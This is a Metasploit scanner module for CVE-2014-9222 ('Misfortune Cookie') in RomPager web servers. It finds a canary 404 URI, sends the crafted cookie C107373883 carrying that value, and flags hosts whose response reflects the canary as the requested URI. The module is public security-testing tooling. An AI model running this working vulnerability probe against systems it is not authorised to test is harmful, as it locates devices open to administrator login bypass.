##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => "Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Scanner",
      'Description' => %q(
        This module scans for HTTP servers that appear to be vulnerable to the
        'Misfortune Cookie' vulnerability which affects Allegro Software
        Rompager versions before 4.34 and can allow attackers to authenticate
        to the HTTP service as an administrator without providing valid
        credentials.
      ),
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>', # metasploit module
        'Lior Oppenheim' # CVE-2014-9222
      ],
      'References' => [
        ['CVE', '2014-9222'],
        ['URL', 'http://mis.fortunecook.ie'],
        ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices
        ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC
      ],
      'DisclosureDate' => 'Dec 17 2014',
      'License' => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'URI to test', '/'])
      ], Exploit::Remote::HttpClient
    )

    register_advanced_options(
      [
        OptString.new('CANARY_URI', [false, 'Try overwriting the requested URI with this canary value (empty for random)']),
        OptString.new('STATUS_CODES_REGEX', [true, 'Ensure that canary pages and probe responses have status codes that match this regex', '^40[134]$'])
      ], self.class
    )
  end

  def check_host(_ip)
    begin
      test_misfortune
    ensure
      disconnect
    end
  end

  def run_host(ip)
    status = check_host(ip)
    case status
    when Exploit::CheckCode::Appears
    when Exploit::CheckCode::Detected
    when Exploit::CheckCode::Vulnerable
      print_good("#{peer} #{status.last}")
    else
      vprint_status("#{peer} #{status.last}")
    end
  end

  def setup
    @status_codes_regex = Regexp.new(datastore['STATUS_CODES_REGEX'])
  end

  # Fingerprints the provided HTTP response and returns
  # Exploit::CheckCode::Appears if it is a vulnerable version of RomPager,
  # otherwise returns the provided fall-back status.
  def check_response_fingerprint(res, fallback_status)
    fp = http_fingerprint(response: res)
    if /RomPager\/(?<version>[\d\.]+)/ =~ fp
      vprint_status("#{peer} is RomPager #{version}")
      if Gem::Version.new(version) < Gem::Version.new('4.34')
        return Exploit::CheckCode::Appears
      end
    end
    fallback_status
  end

  def find_canary
    vprint_status("#{peer} locating suitable canary URI")
    canaries = []
    if datastore['CANARY_URI']
      canaries << datastore['CANARY_URI']
    else
      # several random URIs in the hopes that one, generally the first, will be usable
      0.upto(4) { canaries << '/' + Rex::Text.rand_text_alpha(16) }
    end

    canaries.each do |canary|
      res = send_request_raw(
        'uri' => normalize_uri(canary),
        'method' => 'GET',
        'headers' => headers
      )
      # in most cases, the canary URI will not exist and will return a 404, but
      # if everything under TARGETURI is protected by auth, a 401 may be OK too.
      # but, regardless, respect the configuration set for this module
      return [canary, res.code] if res && res.code.to_s =~ @status_codes_regex
    end
    nil
  end

  def headers
    {
      'Referer' => full_uri
    }
  end

  # To test for this vulnerability, we must first find a URI known to return
  # a 404 (not found) which we will use as a canary.  This URI (for example,
  # /foo) is then taken and used as the value for a carefully crafted cookie
  # when making a request to the configured host+port+uri.  If the response
  # is a 404 and the body includes the canary, it is likely that the cookie
  # overwrote RomPager's concept of the requested URI, indicating that it is
  # vulnerable.
  def test_misfortune
    # find a usable canary URI (one that returns an acceptable status code already)
    if canary = find_canary
      canary_value, canary_code = canary
      vprint_status("#{peer} found canary URI #{canary_value} with code #{canary_code}")
    else
      vprint_error("#{peer} Unable to find a suitable canary URI")
      return Exploit::CheckCode::Unknown
    end

    canary_cookie_name = 'C107373883'
    canary_cookie = canary_cookie_name + "=#{canary_value};"

    # Make a request containing a specific canary cookie name with the value set
    # from the suitable canary value found above.
    res = send_request_raw(
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => 'GET',
      'headers' => headers.merge('Cookie' => canary_cookie)
    )

    unless res
      vprint_error("#{full_uri} no response")
      return Exploit::CheckCode::Unknown
    end

    unless res.code.to_s =~ @status_codes_regex
      vprint_status("#{full_uri} unexpected HTTP code #{res.code} response")
      return check_response_fingerprint(res, Exploit::CheckCode::Detected)
    end

    unless res.body
      vprint_status("#{full_uri} HTTP code #{res.code} had no body")
      return check_response_fingerprint(res, Exploit::CheckCode::Detected)
    end

    # If that canary *value* shows up in the *body*, then there are two possibilities:
    #
    # 1) If the canary cookie *name* is also in the *body*, it is likely that
    # the endpoint is puppeting back our request to some extent and therefore
    # it is expected that the canary cookie *value* would also be there.
    # return Exploit::CheckCode::Detected
    #
    # 2) If the canary cookie *name* is *not* in the *body*, return
    # Exploit::CheckCode::Vulnerable
    if res.body.include?(canary_value)
      if res.body.include?(canary_cookie_name)
        vprint_status("#{full_uri} HTTP code #{res.code} response contained canary cookie name #{canary_cookie_name}")
        return check_response_fingerprint(res, Exploit::CheckCode::Detected)
      else
        vprint_good("#{full_uri} HTTP code #{res.code} response contained canary cookie value #{canary_value} as URI")
        report_vuln(
          host: rhost,
          port: rport,
          name: name,
          refs: references
        )
        return Exploit::CheckCode::Vulnerable
      end
    end

    vprint_status("#{full_uri} HTTP code #{res.code} response did not contain canary cookie value #{canary_value} as URI")
    check_response_fingerprint(res, Exploit::CheckCode::Safe)
  end
end
